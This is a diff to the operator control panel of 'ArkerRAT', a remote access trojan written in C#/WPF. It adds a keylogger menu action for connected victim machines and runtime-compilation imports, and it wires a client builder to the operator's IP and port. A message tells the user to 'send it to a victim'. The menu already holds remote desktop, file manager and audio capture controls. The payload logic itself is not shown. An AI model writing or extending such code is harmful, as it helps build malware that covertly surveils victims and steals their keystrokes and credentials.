@@ -24,6 +24,8 @@ using System.Net;
 using System.Net.Sockets;
 using System.Reflection;
 using System.Resources;
+using Microsoft.CSharp;
+using System.CodeDom.Compiler;
 
 namespace ArkerRatWpfVersion
 {
@@ -208,6 +210,14 @@ namespace ArkerRatWpfVersion
                             Source = TryFindResource("SoundImage") as BitmapImage
                         };
 
+                        MenuItem keyLogger = new MenuItem();
+                        keyLogger.Header = "Key-logger";
+                        keyLogger.Icon = new System.Windows.Controls.Image
+                        {
+                            Stretch = Stretch.Uniform,
+                            Source = TryFindResource("KeyLoggerImage") as BitmapImage
+                        };
+
                         dataItem.ContextMenu = new ContextMenu();
                         dataItem.ContextMenu.Background = new SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 17, 20));
                         dataItem.ContextMenu.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(153, 102, 255));
@@ -217,6 +227,7 @@ namespace ArkerRatWpfVersion
                         dataItem.ContextMenu.Items.Add(remoteDesktop);
                         dataItem.ContextMenu.Items.Add(fileManager);
                         dataItem.ContextMenu.Items.Add(remoteAudio);
+                        dataItem.ContextMenu.Items.Add(keyLogger);
 
                         // Disconnect
                         dataItem.ContextMenu.Items.Add(unInstall);
@@ -239,14 +250,13 @@ namespace ArkerRatWpfVersion
                                 remoteDesktop.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartRemoteDesktop);
                                 fileManager.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartFileManager);
                                 remoteAudio.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartRemoteAudio);
+                                keyLogger.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartKeyLogger);
 
 
                                 shutDown.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].ShutDown);
                                 restart.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Restart);
                                 logOut.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].LogOut);
                                 sleep.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Sleep);
-
-
                             }
                         }
                     }
@@ -465,10 +475,14 @@ namespace ArkerRatWpfVersion
 
         private void Build(object sender, RoutedEventArgs e)
         {
+            Builder arkerBuilder = new Builder(iPInput.Text, buildPort.Text);
+
             MessageBox.Show("ArkerRAT has been compiled SUCCESSFULLY send it to a victim, and start listening for conections at the network tab. " +
                "All the available clients will be shown at the clients tab.");
             consoleLog.AppendText("Client build has succeded!\n");
             consoleLog.ScrollToEnd();
+
+            
         }
 
         private async void Listener(object sender, RoutedEventArgs e)
